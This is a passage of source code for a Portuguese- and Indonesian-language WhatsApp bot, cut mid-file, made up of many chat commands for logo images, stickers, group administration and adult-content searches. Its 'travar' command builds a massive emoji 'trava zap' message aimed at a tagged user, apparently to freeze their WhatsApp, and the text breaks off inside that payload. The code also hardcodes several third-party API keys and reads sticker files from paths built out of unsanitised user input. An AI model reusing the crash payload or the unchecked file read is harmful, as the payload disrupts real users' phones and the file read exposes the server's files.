					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 20) return reply('O texto é longo, até 20 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://darkkkw.herokuapp.com/`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
		   case 'perfil':		  		           

    				client.updatePresence(from, Presence.composing)

				
    				try {

					ppimg = await client.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)

					} catch {

					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'

					}
					
		         	rate = body.slice(1)
		         	const dd =['Não viva somente do que faz sentido','Livre-se dos bajuladores','Não julgue sem conhecer','Não grite alto por sua felicidade','Não se leve o pensamento dos outros','As vzs vale a pena ser frio(a)','Bobeira é não viver a realidade','Sem conselhos, dsclp','A verdade alivia mais do que machuca','Cuidado com oq fala','Se não puder se destacar pelo talento, vença pelo esforço']
					const kk = dd[Math.floor(Math.random() * dd.length)]
					const da =['4','9','8','7','2','5','1','0 que azar','3','6','10']
					const rk = da[Math.floor(Math.random() * da.length)]

					 profile = `╭─「 *SEU PERFIL* 」\n│• *Nome:* ${pushname}\n│• *NUMERO DA SORTE:* ${rk}\n│• *CS:* ${kk}\n│• *Usuário Registrado:* ✓\n│• *Link:* wa.me/${sender.split("@")[0]}\n╰──────────────────`

					buffer = await getBuffer(ppimg)

					client.sendMessage(from, buffer, image, {quoted: mek, caption: profile})

					break
			case 'nickff': 
                             
					client.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/nickepep?apikey=apivinz`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Nick* : ${i}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
                case 'monkey':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/20210222_030251.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.y=39%25&text.0.size=25&text.0.color=ffffff&text.0.font.family=Source%20Sans%20Pro&text.0.font.weight=600`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
                case 'dlg':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://mhankbarbar.tech/api/ephoto?text=${teks}`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
                case 'dnulis':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 200) return reply('O texto é longo, até 200 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/20210222_040232.png?text.0.text=${teks}&text.0.position.gravity=northwest&text.0.position.x=10%25&text.0.position.y=8%25&text.0.align=right&text.0.size=55&text.0.color=000000&text.0.opacity=72&text.0.font.family=Bitter&text.0.font.style=italic`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
                case 'tlogo':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 20) return reply('O texto é longo, até 20 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/20210222_164542.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.y=40%25&text.0.size=50&text.0.color=ffffff&text.0.font.family=Lobster%20Two&text.0.font.weight=800&text.0.font.style=italic`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
                case 'nlogo':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 20) return reply('O texto é longo, até 20 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/20210222_165159.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.y=38%25&text.0.size=24&text.0.color=ff0000&text.0.font.family=Signika&text.0.font.weight=600&text.0.background.opacity=34&text.0.outline.opacity=16`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
                case 'dmeme':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 9) return reply('O texto é longo, até 9 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/20210222_050527.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.x=10%25&text.0.position.y=22%25&text.0.size=18&text.0.color=000000&text.0.font.family=Vollkorn&text.0.font.style=italic`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
                case 'dnobg':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/20210222_052102.png?text.0.text=${teks}&text.0.position.gravity=center&text.0.color=ff0000&text.0.opacity=99&text.0.font.family=Droid%20Serif&text.0.font.weight=600&text.0.background.opacity=74&text.0.outline.opacity=0`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
                case 'imgur':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('ate 15 carácteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://m.imgur.com/t/${teks}`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
//fim logo
//fim comandos olaf				   
				case 'jogo':
					anu = await fetchJson(`http://rt-files.000webhostapp.com/tts.php?apikey=rasitech`, {method: 'get'})
					setTimeout( () => {
					client.sendMessage(from, '*➸ Responda :* '+anu.result.jawaban+'\n'+anu.result.desk, text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_10 Outro segundo…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_20 Outro segundo_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_30 Outro segundo_…', text) // ur cods
					}, 1000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, anu.result.soal, text, { quoted: mek }) // ur cods
					}, 0) // 1000 = 1s,
					break
				case 'bloquear':
				 client.updatePresence(from, Presence.composing) 
				 client.chatRead (from)
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply(mess.only.ownerB)
					client.blockUser (`${body.slice(7)}@c.us`, "add")
					client.sendMessage(from, `perintah Diterima, memblokir ${body.slice(7)}@c.us`, text)
					break
				case 'premiumlist':
					teks = '╭────*「 *PREMIUM USER👑* 」\n'
					for (let V of premium) {
						teks += `│+  @${V.split('@')[0]}\n`
					}
					teks += `│+ Total : ${premium.length}\n╰──────*「 *OLAF 𝐵𝑂𝑇* 」*────`
					client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": premium}})
					break
                  case 'qrcode':
        			if (!isPremium) return reply('Você não é um Membro Premium, entre em contato com o proprietário ou digite *.Daftarvip* para adquirir o acesso Premium!' ,text, { quoted: mek })
					const tex = encodeURIComponent(body.slice(8))
					if (!tex) return client.sendMessage(from, 'Digite um texto/url que deseja criar um código qr', text, {quoted: mek})
					const bufferr = await getBuffer(`https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=${tex}`)
					client.sendMessage(from, bufferr, image, {quoted: mek})
					break
		    	case 'wa.me':
		        case 'wame':
                  client.updatePresence(from, Presence.composing) 
                  options = {
                  text: `「 *LINK WHATSAPP* 」\n\n_Solicitado por_ : *@${sender.split("@s.whatsapp.net")[0]}*\n\nSeu link WhatsApp:\n\n*https://wa.me/${sender.split("@s.whatsapp.net")[0]}*\n\n*Ou*\n\n*https://api.whatsapp.com/send?phone=${sender.split("@")[0]}*\n\n*OLAF DOMINA ⛄❤️🔥*`,
                  contextInfo: { mentionedJid: [sender] }
                  }
                  client.sendMessage(from, options, text, { quoted: mek } )
			      break
		    	case 'link':
		        case 'divu':
                  client.updatePresence(from, Presence.composing) 
                  options = {
                  text: `「 𝑆𝐴𝐿𝑉𝐴 𝑀𝐸𝑈 𝐶𝑇𝑇 𝑄𝑈𝐸𝑅𝑂 𝐻𝑌𝑃𝐸 」\n\n Meu nick é: ${pushname}\n\n*𝐄 𝐒𝐄 𝐐𝐔𝐈𝐒𝐄𝐑 𝐈𝐑 𝐃𝐈𝐕𝐔𝐋𝐆𝐀𝐂̧𝐀̃𝐎 :*\n\n*https://api.whatsapp.com/send?phone=${sender.split("@")[0]}*\n\n⏤͟͟͞͞𝑆𝑂𝐶𝐼𝐸𝑇𝑌 𝑉𝐼𝐸𝑊𝑆 🌴🔥`,
                  contextInfo: { mentionedJid: [sender] }
                  }
                  client.sendMessage(from, options, text, { quoted: mek } )
			      break			      
                  case 'playstore':
                ps = `${body.slice(11)}`
                  anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/playstore?q=${ps}`, {method: 'get'})
                  store = '======================\n'
                  for (let ply of anu.result){
                  store += `• *Nome Apk:* ${ply.app.name}\n• *ID:* ${ply.app.id}\n• *Link Apk:* ${ply.app.url}\n===================°]\n`
                  }
                  reply(store.trim())
                  break
				case 'getsticker':
				case 'gets':
					namastc = body.slice(12)
					result = fs.readFileSync(`./strg/sticker/${namastc}.webp`)
					client.sendMessage(from, result, sticker, {quoted :mek})
					break
				case 'liststicker':
				case 'stickerlist':
					teks = '*Lista de Figurinhas :*\n\n'
					for (let awokwkwk of setiker) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setiker.length}*`
					client.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
				case 'addsticker':
		     		if (!isOwner) return reply(mess.only.ownerB)
			    	if (!isPremium) return reply(mess.only.premium)
					if (!isQuotedSticker) return reply('Marque o sticker pfv')
					svst = body.slice(12)
					if (!svst) return reply('Qual é o nome do adesivo?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await client.downloadMediaMessage(boij)
					setiker.push(`${svst}`)
					fs.writeFileSync(`./strg/sticker/${svst}.webp`, delb)
					fs.writeFileSync(`./strg/stik.json`, JSON.stringify(setiker))
					client.sendMessage(from, `Adicionando adesivo com sucesso\nVerificar pelo caminho ${prefix}liststicker`, MessageType.text, { quoted: mek })
					break
			     case 'nekopoi':
			   reply(mess.wait)
              	    if (args.length < 1) return reply('Cadê o texto, mano?')
                    teks = body.slice(9)
					anu = await fetchJson(`https://api.vhtear.com/nekosearch?query=${teks}&apikey=8e3edaa28653920058ba1522`, {method: 'get'})
                    teks = `===============\n`
                    for (let neko of anu.result) {
                    teks += `Título: ${neko.title}\nDescrição: ${neko.detail}\n===============\n`
                    }
                    reply(teks.trim())
			     	await limitAdd(sender) 
			     	break  
// NINJALOGO				
				case 'nlogo':
				var gh = body.slice(11)
				var nin = gh.split("&")[0];
				var ja = gh.split("&")[1];
				if (args.length < 1) return reply('「❗」Contoh : ${prefix}ninjalogo IKY & Gans')
				reply(mess.wait)
				buffer = await getBuffer(`https://api.xteam.xyz/textpro/ninjalogo?text=${nin}&text2=${ja}&APIKEY=${XteamKey}`)
				client.sendMessage(from, buffer, image, {quoted: mek})
				await limitAdd(sender)
				break
// HALLOWEEN				
		case 'htxt':
				if (args.length < 1) return reply(ind.wrongf())
				ween = body.slice(15)
				if (ween.length > 10) return reply('Teksnya kepanjangan, maksimal 9 karakter')
				reply(mess.wait)
				buffer = await getBuffer(`https://api.xteam.xyz/textpro/helloweenfire?text=${ween}&APIKEY=${XteamKey}`)
		    client.sendMessage(from, buffer, image, {quoted: mek})
		    await limitAdd(sender)	
		    break
// PORNHUB
				case 'phub':
				var gh = body.slice(9)
				var porn = gh.split("&")[0];
				var hub = gh.split("&")[1];
				if (args.length < 1) return reply('「❗」Contoh : ${prefix}pornhub IKY & Hub')
				reply(mess.wait)
				buffer = await getBuffer(`https://api.xteam.xyz/textpro/ph?text=${porn}&text2=${hub}&APIKEY=${XteamKey}`)
				client.sendMessage(from, buffer, image, {quoted: mek})
				await limitAdd(sender)
				break
//GEMBOK TEXT
                case 'gtxt':
					var gh = body.slice(12)
					var gem = gh.split("&")[0];
					var bok = gh.split("&")[1];
					if (args.length < 1) return reply('[❗] Contoh : ${prefix}gemboktext 11 01 2021 & IKY dan Nadia')
					reply(mess.wait)
					buffer = await getBuffer(`https://api.vhtear.com/padlock?text1=${gem}&text2=${bok}&apikey=${VhtearKey}`)
					client.sendMessage(from, buffer, image, {quoted: mek})
					await limitAdd(sender)
					break
			     case 'xvideos':
              	    if (args.length < 1) return reply('Cadê o texto, mano?')
                    anu = await fetchJson(`https://api.arugaz.my.id/api/media/xvideo/search?query=${body.slice(9)}`, {method: 'get'})
                    teks = `===============\n`
                    for (let b of anu.result) {
                    teks += `• Título: ${b.title}\n• Info: ${b.info}\n• Link: ${b.link}\n===============\n`
                    }
                    reply(teks.trim())
			     	await limitAdd(sender) 
			     	break 
            case 'onichan':
            case 'bodoh':
                client.sendMessage(from, buff, './lindy/baka.mp3', audio/mp3, {quoted: mek, ptt:true})
                break
				case 'daftar':
					client.updatePresence(from, Presence.composing)
					if (args.length < 1) return reply(`Parameter Salah\nCommand : ${prefix}daftar nama|umur\nContoh : ${prefix}daftar ICHI|12`)
					var reg = body.slice(8)
					var jeneng = reg.split("|")[0];
					var umure = reg.split("|")[1];
						user.push(sender)
						fs.writeFileSync('./src/user.json', JSON.stringify(user))
						client.sendMessage(from, `\`\`\`Pendaftaran berhasil dengan SN: TM08GK8HEUZBEHDO\`\`\`\n\n\`\`\`Pada ${date} ${time}\`\`\`\n\`\`\`[Nome]: ${jeneng}\`\`\`\n\`\`\`[Número]: wa.me/${sender.split("@")[0]}\`\`\`\n\`\`\`[Era]: ${umure}\`\`\`\n\`\`\`Para usar um bot\`\`\`\n\`\`\`Por favor\`\`\`\n\`\`\`enviar ${prefix}help\`\`\`\n\`\`\`\nTotal de usuários ${user.length}\`\`\``, text, {quoted: mek})
					break
				case 'hunti':
					reply(mess.wait)
					anu = await fetchJson(`https://api.vhtear.com/nhentaipdfdownload?query=287167&apikey={BELI APIKEY BIAR WORK DI 0816546638}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					bufferjj = await getBuffer(anu.result.pdf_file)
					client.sendMessage(from, bufferjj, document, {mimetype: 'document/pdf', quoted: mek})
					break
		case 'heroml':  
					
				reply(`[❕] Carregando`)
				ige = body.slice(8)
				anu = await fetchJson(`http://api.hurtzcrafter.xyz/herodetail?hero=${ige}`) 
				buffer7 = await getBuffer(anu.result.image)
				teks = `Hasil\n*Hero Name*: ${anu.result.hero_name}\n*Quotes Hero*: ${anu.result.entrance_quotes}\n*Hero Feature*: ${anu.result.hero_feature}\n*Items*: ${anu.result.items}\n*Character*: ${anu.result.character.chara}\n*Movement Speed*: ${anu.result.attributes.movement_speed}\n*Physical Attack*: ${anu.result.attributes.physical_attack}\n*Magic Power*: ${anu.result.attributes.magic_power}\n*Attack Speed*: ${anu.result.attributes.attack_speed}\n*Physical Defense*: ${anu.result.attributes.physical_defense}\n*Basic Atk Crit Rate*: ${anu.result.attributes.basic_atk_crit_rate}\n*HP*: ${anu.result.attributes.hp}\n*Mana*: ${anu.result.attributes.mana}\n*ability_crit_rate*: ${anu.result.attributes.ability_crit_rate}\n*hp_regen*: ${anu.result.attributes.hp_regen}\n*mana_regen*: ${anu.result.attributes.mana_regen}\n*Price Hero BP*: ${anu.result.price.battle_point}\n*Price Hero DM*: ${anu.result.price.diamond}\n*Price Hero FRAG*: ${anu.result.price.hero_fragment}\n*Durability*: ${anu.result.skill.durability}\n*offense*: ${anu.result.skill.offense}\n*skill_effects*: ${anu.result.skill.skill_effects}\n*difficulty*: ${anu.result.skill.difficulty}\n*speciality*: ${anu.result.speciality}\n*laning_recommendation*: ${anu.result.laning_recommendation}\n*release_date*: ${anu.result.release_date}`
				client.sendMessage(from, buffer7, image, {quoted: mek, caption: teks})
				await limitAdd(sender)
				break					
                 case 'setdesc':
			    	 if (!isGroup) return reply(mess.only.group)
				     if (!isGroupAdmins) return reply(mess.only.admin)
			   	     if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				     client.groupUpdateDescription(from, `${body.slice(9)}`)
				     client.sendMessage(from, 'Descrição alterada com sucesso', text, {quoted: mek})
				     break
			case 'google':
                const googleQuery = body.slice(8)
                if(googleQuery == undefined || googleQuery == ' ') return reply(`*Hasil Pencarian : ${googleQuery}* tidak ditemukan`)
                google({ 'query': googleQuery }).then(results => {
                let vars = `_*Resultado da pesquisa : ${googleQuery}*_\n`
                for (let i = 0; i < results.length; i++) {
                    vars +=  `\n═════════════════\n\n*Título* : ${results[i].title}\n\n*Descrição* : ${results[i].snippet}\n\n*Link* : ${results[i].link}\n\n`
                }
                    reply(vars)
                }).catch(e => {
                    console.log(e)
                    client.sendMessage(from, 'Google Error : ' + e);
                })
                await limitAdd(sender) 
                break 
		case 'bpfont':
			bp = `${body.slice(8)}`
			anu = await fetchJson(`https://api.terhambar.com/bpk?kata=${bp}`, {method: 'get'})
			reply (anu.text)
			await limitAdd(sender) 
			break 
			 
                case 'speed':
                case 'ping':
                
                    const timestamp = speed();
                    const latensi = speed() - timestamp
                    client.updatePresence(from, Presence.composing) 
				uptime = process.uptime()
                    client.sendMessage(from, `Speed: *${latensi.toFixed(4)} _Segundos_*\nDispositivo: *Xiaomi*\nRAM: *6/64*\nData: *Telkomsel*\nRede: *4G*\nStatus: *Ainda não cobrado*\nTipo do bot: *Termux Somente*\n\n*O bot esteve ativo por*\n*${kyun(uptime)}*`, text, { quoted: mek})
                    break
			case 'closetime': 
              client.updatePresence(from, Presence.composing) 
		if (!isGroupAdmins) return reply('cade seu adm lixo?')
              if (args[1]=="segundo") {var timer = args[0]+"000"
				} else if (args[1]=="minuto") {var timer = args[0]+"0000"
				} else if (args[1]=="hora") {var timer = args[0]+"00000"
				} else {return reply("*escolher:*\nsegundo\nminuto\nhora\n\n*exemp*\n10 segundo")}
				setTimeout( () => {
					var nomor = mek.participant
					const close = {
					text: `Grupo fechado pelo administrador @${nomor.split("@s.whatsapp.net")[0]}\nagora *apenas administradores* podem enviar mensagens`,
					contextInfo: { mentionedJid: [nomor] }
					}
					client.groupSettingChange (from, GroupSettingChange.messageSend, true);
					reply(close)
				}, timer)
				break                                      
				case 'delete':
				case 'del':
				case 'd':  
					if (!isPremium) return reply('Você não é um Membro Premium, entre em contato com o proprietário ou digite *.Daftarvip* para adquirir o acesso Premium!' ,text, { quoted: mek })
					if (!isGroup)return reply(mess.only.group)
					if (!isGroupAdmins)return reply(mess.only.admin)
					client.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
				case 'ninjalogo':
				var gh = body.slice(11)
				var nin = gh.split("&")[0];
				var ja = gh.split("&")[1];
				if (args.length < 1) return reply(`「❗」Contoh : ${prefix}ninjalogo Ramlan & Gans`)
				reply(mess.wait)
				buffer = await getBuffer(`https://api.xteam.xyz/textpro/ninjalogo?text=${nin}&text2=${ja}&APIKEY=${XteamKey}`)
				baby.sendMessage(from, buffer, image, {quoted: mek})
				await limitAdd(sender)
				break				
		case 'halloweentext':
		
				if (args.length < 1) return reply(ind.wrongf())
				ween = body.slice(15)
				if (ween.length > 10) return reply('Teksnya kepanjangan, maksimal 9 karakter')
				reply(mess.wait)
				buffer = await getBuffer(`https://api.xteam.xyz/textpro/helloweenfire?text=${ween}&APIKEY=${XteamKey}`)
		    baby.sendMessage(from, buffer, image, {quoted: mek})
		    await limitAdd(sender)	
		    break
				case 'pornhub':
				var gh = body.slice(9)
				var porn = gh.split("&")[0];
				var hub = gh.split("&")[1];
				if (args.length < 1) return reply('escreve certo irmão')
				reply(mess.wait)
				buffer = await getBuffer(`https://api.vhtear.com/pornlogo?text1=${porn}&text2=${hub}&apikey=${VhtearKey}`)
				client.sendMessage(from, buffer, image, {quoted: mek})
				await limitAdd(sender)
				break
//ephoto		
               case 'placa':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://api.zeks.xyz/api/gplaybutton?text=${teks}&apikey=apivinz`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break

               case 'freef':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://api.zeks.xyz/api/epep?text=${teks}&apikey=apivinz`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
		
               case 'emoje':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://api.zeks.xyz/api/emoji-image?apikey=apivinz&emoji=${teks}`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break		
                case 'gltext':
					var gh = body.slice(12)
					var gli = gh.split("&")[0];
					var tch = gh.split("&")[1];
					if (args.length < 1) return reply('[❗] Contoh : ${prefix}glitchtext IKY & Gans')
					reply(mess.wait)
					buffer = await getBuffer(`https://api.vhtear.com/glitchtext?text1=${gli}&text2=${tch}%20&apikey=${VhtearKey}`)
					client.sendMessage(from, buffer, image, {quoted: mek})
					await limitAdd(sender)
					break
                case 'bloodtxt':
					var gh = body.slice(12)
					var gem = gh.split("&")[0];
					var bok = gh.split("&")[1];
					if (args.length < 1) return reply(`「❗」Contoh : ${prefix}gemboktext NAKANO&MIKU`)
					reply(mess.wait)
					buffer = await getBuffer(`https://tobz-api.herokuapp.com/api/textpro?theme=wolflogo1&text1=Tobz&text2=Ganz&apikey=${TobzApi}`)
					client.sendMessage(from, buffer, image, {quoted: mek})
					await limitAdd(sender)
					break
				case 'nuh':
				case 'tuh':
				if (args.length < 1) return reply('txt, cade?')
				IKY = body.slice(8)
				reply('「❗」fazendo')
				buff = await getBuffer(`https://api.xteam.xyz/magernulis2?text=${IKY}&APIKEY=${XteamKey}`)
				client.sendMessage(from, buff, image, {quoted: mek, caption: 'Melhor escrever você mesma, mana :*'})
				await limitAdd(sender)
				break				
                case 'glitchtext':
					var gh = body.slice(12)
					var gli = gh.split("&")[0];
					var tch = gh.split("&")[1];
					if (args.length < 1) return reply(`「❗」Contoh : ${prefix}glitchtext NAKANO&MIKU`)
					reply(mess.wait)
					buffer = await getBuffer(`https://api.xteam.xyz/textpro/glitch?text=${gli}&text2=${tch}&APIKEY=${XteamKey}`)
					baby.sendMessage(from, buffer, image, {quoted: mek})
					await limitAdd(sender)
					break
                case 'travar':
                     const pesan = body.slice(5)
                      if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Em quem você quer dar o fatality?')
		     	     	mentidn = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                      if (!isPremium) return reply(mess.only.premium)
                      if (pesan.length > 5000) return client.sendMessage(from, 'ate 5k de caracteres', msgType.text, {quoted: mek})
                        var nomor = mek.participant
                       const teks1 = `*[TRAVA🐊🚩]*\nTRAVADO POR : @${nomor.split("@s.whatsapp.net")[0]}\nTRAVA: TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP 